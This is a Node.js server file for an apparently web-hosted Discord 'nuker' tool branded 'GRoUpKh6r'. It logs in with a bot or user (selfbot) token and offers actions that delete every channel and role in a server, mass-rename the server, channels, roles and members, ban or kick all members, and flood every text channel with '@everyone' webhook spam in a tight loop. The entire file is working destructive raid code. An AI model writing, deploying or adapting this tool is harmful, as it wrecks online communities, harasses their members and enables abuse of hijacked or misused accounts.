// language: JavaScript, file: server.js, target: Node.js / Web Hosting
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Client: SelfClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, Intents } = require('discord.js');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

const activeSpammers = new Map();

function createDiscordClient(tokenType) {
    if (tokenType === 'bot') {
        return new BotClient({
            intents: [
                Intents.FLAGS.GUILDS,
                Intents.FLAGS.GUILD_MESSAGES,
                Intents.FLAGS.GUILD_MEMBERS,
                Intents.FLAGS.GUILD_BANS
            ]
        });
    } else {
        return new SelfClient();
    }
}

io.on('connection', (socket) => {
    
    socket.on('execute_action', async (data) => {
        const { tokenType, token, guildId, action, targetName, webhookName, spamText } = data;
        const client = createDiscordClient(tokenType);

        try {
            await client.login(token);
            const guild = await client.guilds.fetch(guildId);

            if (action === 'nuke_all') {
                socket.emit('status', { msg: '[*] Starting total nuke protocol...' });
                const channels = await guild.channels.fetch();
                channels.forEach(async c => { await c?.delete().catch(() => {}); });
                const roles = await guild.roles.fetch();
                roles.forEach(async r => { if (r.editable && r.id !== guild.id) await r.delete().catch(() => {}); });
                await guild.setName(targetName || 'GRoUpKh6r').catch(() => {});
                socket.emit('status', { msg: '[+] Total nuke executed successfully.' });
            }
            else if (action === 'create_channels') {
                socket.emit('status', { msg: '[*] Creating channels...' });
                const name = targetName || 'gr0upkh6r';
                const promises = [];
                for (let i = 1; i <= 35; i++) {
                    promises.push(guild.channels.create(name, { type: 'GUILD_TEXT' }).catch(() => {}));
                }
                await Promise.all(promises);
                socket.emit('status', { msg: '[+] Channels created.' });
            }
            else if (action === 'delete_channels') {
                socket.emit('status', { msg: '[*] Deleting all channels...' });
                const channels = await guild.channels.fetch();
                channels.forEach(async c => { await c?.delete().catch(() => {}); });
                socket.emit('status', { msg: '[+] All channels deleted.' });
            }
            else if (action === 'create_roles') {
                socket.emit('status', { msg: '[*] Creating roles...' });
                const name = targetName || 'GRoUpKh6r';
                const promises = [];
                for (let i = 1; i <= 30; i++) {
                    promises.push(guild.roles.create({ name: name, color: 'RANDOM' }).catch(() => {}));
                }
                await Promise.all(promises);
                socket.emit('status', { msg: '[+] Roles created.' });
            }
            else if (action === 'delete_roles') {
                socket.emit('status', { msg: '[*] Deleting all roles...' });
                const roles = await guild.roles.fetch();
                roles.forEach(async r => { if (r.editable && r.id !== guild.id) await r.delete().catch(() => {}); });
                socket.emit('status', { msg: '[+] All roles deleted.' });
            }
            else if (action === 'rename_channels') {
                socket.emit('status', { msg: '[*] Renaming channels...' });
                const channels = await guild.channels.fetch();
                const name = targetName || 'gr0upkh6r-editted';
                channels.forEach(async c => { await c?.setName(name).catch(() => {}); });
                socket.emit('status', { msg: '[+] Channels renamed.' });
            }
            else if (action === 'rename_roles') {
                socket.emit('status', { msg: '[*] Renaming roles...' });
                const roles = await guild.roles.fetch();
                const name = targetName || 'GRoUpKh6r-Role';
                roles.forEach(async r => { if (r.editable && r.id !== guild.id) await r.setName(name).catch(() => {}); });
                socket.emit('status', { msg: '[+] Roles renamed.' });
            }
            else if (action === 'rename_server') {
                socket.emit('status', { msg: '[*] Renaming server...' });
                await guild.setName(targetName || 'GRoUpKh6r#91').catch(() => {});
                socket.emit('status', { msg: '[+] Server renamed.' });
            }
            else if (action === 'rename_members') {
                socket.emit('status', { msg: '[*] Renaming members...' });
                const members = await guild.members.fetch();
                const name = targetName || 'GRoUpKh6r';
                members.forEach(async m => { await m.setNickname(name).catch(() => {}); });
                socket.emit('status', { msg: '[+] Members renamed.' });
            }
            else if (action === 'ban_members') {
                socket.emit('status', { msg: '[*] Banning members...' });
                const members = await guild.members.fetch();
                members.forEach(async m => { await m.ban({ reason: 'GRoUpKh6r' }).catch(() => {}); });
                socket.emit('status', { msg: '[+] Members banned.' });
            }
            else if (action === 'kick_members') {
                socket.emit('status', { msg: '[*] Kicking members...' });
                const members = await guild.members.fetch();
                members.forEach(async m => { await m.kick('GRoUpKh6r').catch(() => {}); });
                socket.emit('status', { msg: '[+] Members kicked.' });
            }
            else if (action === 'create_webhooks') {
                socket.emit('status', { msg: '[*] Creating webhooks...' });
                const channels = await guild.channels.fetch();
                const webhookUrls = [];
                const whName = webhookName || 'GRoUpKh6r-Hook';
                for (const [id, channel] of channels) {
                    if (channel.type === 'GUILD_TEXT' || channel.type === 0) {
                        try {
                            const wh = await channel.createWebhook(whName);
                            webhookUrls.push(wh.url);
                        } catch (e) {}
                    }
                }
                activeSpammers.set(socket.id, webhookUrls);
                socket.emit('status', { msg: `[+] Created ${webhookUrls.length} webhooks (${whName}).` });
            }
            else if (action === 'webhook_spam') {
                const webhooks = activeSpammers.get(socket.id);
                if (!webhooks || webhooks.length === 0) {
                    socket.emit('status', { msg: '[!] Error: Create webhooks first!' });
                    return;
                }
                socket.emit('status', { msg: '[*] Webhook spam running...' });
                const text = spamText || '@everyone GRoUpKh6r#91 ON TOP';
                const spamPayload = { content: text };
                
                const spamLoop = async () => {
                    while (activeSpammers.has(socket.id)) {
                        const promises = webhooks.map(url => axios.post(url, spamPayload).catch(() => {}));
                        await Promise.all(promises);
                        await new Promise(r => setTimeout(r, 40));
                    }
                };
                spamLoop();
            }
            else if (action === 'stop_spam') {
                activeSpammers.delete(socket.id);
                socket.emit('status', { msg: '[!] Spam halted.' });
            }

            client.destroy();
        } catch (err) {
            socket.emit('status', { msg: `[!] Error: ${err.message}` });
        }
    });

    socket.on('disconnect', () => {
        activeSpammers.delete(socket.id);
    });
});

server.listen(process.env.PORT || 8080, () => {
    console.log('GRoUpKh6r Server active');
});
